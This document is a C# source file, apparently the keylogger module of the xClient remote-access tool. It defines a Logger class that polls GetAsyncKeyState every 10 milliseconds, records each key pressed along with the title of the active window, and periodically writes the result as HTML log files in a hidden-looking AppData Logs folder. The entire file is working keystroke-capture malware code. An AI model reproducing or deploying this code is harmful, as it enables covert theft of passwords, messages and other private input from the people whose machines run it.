using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Keylogger;

namespace xClient.Core.Keylogger
{
    public class Logger
    {
        public static Logger Instance;

        public bool Enabled
        {
            get { return _timerLogKeys.Enabled && _timerFlush.Enabled && _timerEmptyKeyBuffer.Enabled; }
            set
            {
                _timerLogKeys.Enabled = _timerFlush.Enabled = _timerEmptyKeyBuffer.Enabled = value;
            }
        }

        private StringBuilder _logFileBuffer;
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly KeyloggerKeys[] _allKeys;
        private readonly KeyloggerKeys[] _specialKeys;
        private volatile List<LoggedKey> _keyBuffer;
        private readonly System.Timers.Timer _timerLogKeys;
        private readonly System.Timers.Timer _timerEmptyKeyBuffer;
        private readonly System.Timers.Timer _timerFlush;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval, in milliseconds, to flush the contents of the keylogger to the file.</param>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            _allKeys = GetKeyloggerKeys();
            _specialKeys = GetSpecialKeys();

            _keyBuffer = new List<LoggedKey>();

            this._timerLogKeys = new System.Timers.Timer { Enabled = false, Interval = 10 };
            this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;

            this._timerEmptyKeyBuffer = new System.Timers.Timer { Enabled = false, Interval = 500 };
            this._timerEmptyKeyBuffer.Elapsed += this.timerEmptyKeyBuffer_Elapsed;

            this._timerFlush = new System.Timers.Timer { Enabled = false, Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            this._logFileBuffer = new StringBuilder();
        }

        /// <summary>
        /// Retrieves an array of all keylogger keys that are special.
        /// </summary>
        /// <returns></returns>
        private static KeyloggerKeys[] GetSpecialKeys()
        {
            List<KeyloggerKeys> SpecialKeys = new List<KeyloggerKeys>();

            try
            {
                foreach (KeyloggerKeys key in Enum.GetValues(typeof(KeyloggerKeys)))
                {
                    try
                    {
                        if (key.IsSpecialKey())
                        {
                            SpecialKeys.Add(key);
                        }
                    }
                    catch
                    { }
                }
            }
            catch
            { }

            return SpecialKeys.ToArray();
        }

        /// <summary>
        /// Retrieves an array of all keylogger keys that are supported.
        /// </summary>
        /// <returns></returns>
        private static KeyloggerKeys[] GetKeyloggerKeys()
        {
            List<KeyloggerKeys> NormalKeys = new List<KeyloggerKeys>();

            try
            {
                foreach (KeyloggerKeys key in Enum.GetValues(typeof(KeyloggerKeys)))
                {
                    try
                    {
                        NormalKeys.Add(key);
                    }
                    catch
                    { }
                }

                return NormalKeys.ToArray();
            }
            catch
            {
                return new KeyloggerKeys[0];
            }
        }

        private string HighlightSpecialKey(string name)
        {
            return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
        }

        private void timerEmptyKeyBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            int j = 0;

            foreach (var k in _keyBuffer)
            {
                //
                if (k != null && !string.IsNullOrEmpty(k.PressedKey.GetKeyloggerKeyName()))
                {
                    if (k.PressedKey.IsSpecialKey())
                    {
                        // TODO: Re-Write this portion with the portion for when the timer elapses.

                        //_logFileBuffer.Append(
                        //    HighlightSpecialKey(((k.ModifierKeys.ShiftKeyPressed) ? "SHIFT-" : string.Empty) +
                        //    ((k.ModifierKeys.CtrlKeyPressed) ? "CTRL-" : string.Empty) +
                        //    ((k.ModifierKeys.AltKeyPressed) ? "ALT-" : string.Empty) +
                        //    ((k.ModifierKeys.ShiftKeyPressed) ? "ESC-" : string.Empty) +
                        //    FromKeys(k.PressedKey.KeyloggerKeyName(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock)));
                    }
                }
                else
                {
                    _logFileBuffer.Append(FromKeys(k.PressedKey.GetKeyloggerKeyValue(), k.ModifierKeys.ShiftKeyPressed, k.ModifierKeys.CapsLock));
                }
            }
            j++;
            if (j > 0 && j <= _keyBuffer.Count)
                _keyBuffer.RemoveRange(0, j);
        }

        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            // Loop through each value in the array of keys to record.
            foreach (short i in _allKeys)
            {
                // GetAsycKeyState returns the result by setting the most significant
                // bit if the key is up, and sets the least significant bit if the
                // key was pressed.
                if (Win32.GetAsyncKeyState(i) == -32767)
                {
                    try
                    {
                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)i };
                        KeyToLog.RecordModifierKeys();

                        _keyBuffer.Add(KeyToLog);
                        _hWndTitle = GetActiveWindowTitle(); //Get active thread window title

                        if (!string.IsNullOrEmpty(_hWndTitle))
                        {
                            // Only write the title to the log file if the names are different.
                            if (_hWndTitle != _hWndLastTitle)
                            {
                                _hWndLastTitle = _hWndTitle;
                                _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                            }
                        }
                    }
                    catch
                    { }
                }
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write(
                                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                    DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            Win32.GetWindowText(Win32.GetForegroundWindow().ToInt32(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }

        private IntPtr GetActiveKeyboardLayout()
        {
            uint pid;
            //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
            return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
        }

        private char? FromKeys(int keys, bool shift, bool caps)
        {
            //keyStates is a byte array that specifies the current state of the keyboard and keys
            //The keys we are interested in are modifier keys such as shift and caps lock
            var keyStates = new byte[256];

            if (shift)
                //keyStates[16] tells our ToUnicodeEx method the state of the shift key which is 0x80 (Key pressed down)
                keyStates[16] = 0x80;

            if (caps)
                //keyStates[20] tells our ToUnicodeEx method the state of the Capslock key which is 0x01 (Key toggled on)
                keyStates[20] = 0x01;

            var sb = new StringBuilder(10);

            return Win32.ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                                     ? (char?)sb[0]
                                     : null;
        }
    }
}